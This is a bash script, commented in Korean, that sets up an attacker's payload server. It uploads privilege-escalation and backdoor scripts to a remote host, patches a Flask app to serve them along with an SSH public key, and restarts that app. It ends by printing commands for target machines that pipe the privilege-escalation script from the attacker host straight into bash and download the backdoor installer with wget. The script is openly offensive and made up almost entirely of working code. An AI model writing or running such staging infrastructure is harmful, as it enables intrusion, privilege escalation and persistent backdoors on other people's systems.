#!/bin/bash
#
# 공격자 서버 설정 스크립트
# 스크립트 파일들을 공격자 서버에 업로드하고 Flask 서버 설정
#
# 사용법: ./setup_attacker_server.sh <ATTACKER_IP>
#

if [ -z "$1" ]; then
    echo "사용법: ./setup_attacker_server.sh <ATTACKER_IP>"
    echo "예: ./setup_attacker_server.sh 13.158.67.78"
    exit 1
fi

ATTACKER_IP="$1"
SSH_KEY="$HOME/.ssh/id_rsa"

echo "============================================================"
echo "공격자 서버 설정"
echo "============================================================"
echo "공격자 IP: $ATTACKER_IP"
echo ""

# 1. 스크립트 디렉토리 생성
echo "[*] 공격자 서버에 디렉토리 생성..."
ssh -i "$SSH_KEY" ubuntu@"$ATTACKER_IP" << 'EOF'
mkdir -p ~/scripts
mkdir -p ~/static
EOF

if [ $? -ne 0 ]; then
    echo "[-] SSH 연결 실패!"
    exit 1
fi

echo "[+] 디렉토리 생성 완료"

# 2. 스크립트 파일 업로드
echo ""
echo "[*] 스크립트 파일 업로드 중..."

scp -i "$SSH_KEY" privilege_escalation.sh ubuntu@"$ATTACKER_IP":~/scripts/
scp -i "$SSH_KEY" backdoor_install.sh ubuntu@"$ATTACKER_IP":~/scripts/

if [ $? -ne 0 ]; then
    echo "[-] 파일 업로드 실패!"
    exit 1
fi

echo "[+] 스크립트 업로드 완료"

# 3. Flask 서버에 /scripts 라우트 추가
echo ""
echo "[*] Flask 서버 설정 업데이트 중..."

ssh -i "$SSH_KEY" ubuntu@"$ATTACKER_IP" << 'EOFSERVER'
# attacker_server.py 백업
if [ -f attacker_server.py ]; then
    cp attacker_server.py attacker_server.py.bak
    echo "[+] attacker_server.py 백업 완료"
fi

# 스크립트 제공 라우트 추가 스크립트 생성
cat > add_script_routes.py << 'EOFPYTHON'
#!/usr/bin/env python3
"""
attacker_server.py에 /scripts 라우트 추가
"""

import sys

# attacker_server.py 읽기
try:
    with open('attacker_server.py', 'r') as f:
        content = f.read()
except FileNotFoundError:
    print("[-] attacker_server.py를 찾을 수 없습니다!")
    sys.exit(1)

# 이미 /scripts 라우트가 있는지 확인
if '/scripts/' in content or '@app.route(\'/scripts' in content:
    print("[*] /scripts 라우트가 이미 존재합니다.")
    sys.exit(0)

# Flask import 확인
if 'from flask import' not in content:
    print("[-] Flask import를 찾을 수 없습니다!")
    sys.exit(1)

# send_from_directory import 추가
if 'send_from_directory' not in content:
    content = content.replace(
        'from flask import',
        'from flask import send_from_directory,'
    )

# 라우트 추가 위치 찾기 (app = Flask 다음)
insert_position = content.find('app = Flask(__name__)')
if insert_position == -1:
    print("[-] Flask app 초기화를 찾을 수 없습니다!")
    sys.exit(1)

# 다음 줄로 이동
insert_position = content.find('\n', insert_position) + 1

# 새 라우트 코드
new_routes = '''
# 스크립트 제공 라우트
@app.route('/scripts/<path:filename>')
def serve_script(filename):
    """권한 상승 및 백도어 스크립트 제공"""
    import os
    script_dir = os.path.join(os.path.expanduser('~'), 'scripts')
    return send_from_directory(script_dir, filename, mimetype='text/plain')

@app.route('/ssh-pubkey')
def serve_ssh_pubkey():
    """SSH 공개키 제공"""
    import os
    pubkey_path = os.path.expanduser('~/.ssh/id_rsa.pub')
    try:
        with open(pubkey_path, 'r') as f:
            return f.read(), 200, {'Content-Type': 'text/plain'}
    except FileNotFoundError:
        return 'SSH public key not found', 404

'''

# 라우트 삽입
new_content = content[:insert_position] + new_routes + content[insert_position:]

# 파일 쓰기
with open('attacker_server.py', 'w') as f:
    f.write(new_content)

print("[+] /scripts 라우트 추가 완료!")
print("[+] /ssh-pubkey 라우트 추가 완료!")
EOFPYTHON

# Python 스크립트 실행
python3 add_script_routes.py

if [ $? -eq 0 ]; then
    echo "[+] Flask 서버 업데이트 완료"
else
    echo "[-] Flask 서버 업데이트 실패"
    exit 1
fi

# Flask 서버 재시작
echo ""
echo "[*] Flask 서버 재시작..."

# 기존 프로세스 종료
pkill -f attacker_server.py

# 백그라운드로 재시작
nohup python3 attacker_server.py > flask.log 2>&1 &

sleep 2

if ps aux | grep -q "[a]ttacker_server.py"; then
    echo "[+] Flask 서버 시작됨"
else
    echo "[!] Flask 서버 시작 실패 - 수동으로 시작하세요"
    echo "    python3 attacker_server.py"
fi
EOFSERVER

if [ $? -ne 0 ]; then
    echo "[-] 서버 설정 실패!"
    exit 1
fi

# 4. 확인
echo ""
echo "============================================================"
echo "설정 확인"
echo "============================================================"

echo "[*] 스크립트 파일 확인..."
ssh -i "$SSH_KEY" ubuntu@"$ATTACKER_IP" "ls -lh scripts/"

echo ""
echo "[*] 스크립트 접근 테스트..."

# privilege_escalation.sh 접근 테스트
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://$ATTACKER_IP:5000/scripts/privilege_escalation.sh")

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] privilege_escalation.sh 접근 가능"
else
    echo "[-] privilege_escalation.sh 접근 실패 (HTTP $HTTP_CODE)"
fi

# backdoor_install.sh 접근 테스트
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://$ATTACKER_IP:5000/scripts/backdoor_install.sh")

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] backdoor_install.sh 접근 가능"
else
    echo "[-] backdoor_install.sh 접근 실패 (HTTP $HTTP_CODE)"
fi

echo ""
echo "============================================================"
echo "공격자 서버 설정 완료!"
echo "============================================================"
echo ""
echo "사용 가능한 URL:"
echo "  http://$ATTACKER_IP:5000/scripts/privilege_escalation.sh"
echo "  http://$ATTACKER_IP:5000/scripts/backdoor_install.sh"
echo "  http://$ATTACKER_IP:5000/ssh-pubkey"
echo ""
echo "타겟 서버에서 사용 예시:"
echo "  curl http://$ATTACKER_IP:5000/scripts/privilege_escalation.sh | bash"
echo "  wget http://$ATTACKER_IP:5000/scripts/backdoor_install.sh -O /tmp/bd.sh"
echo ""
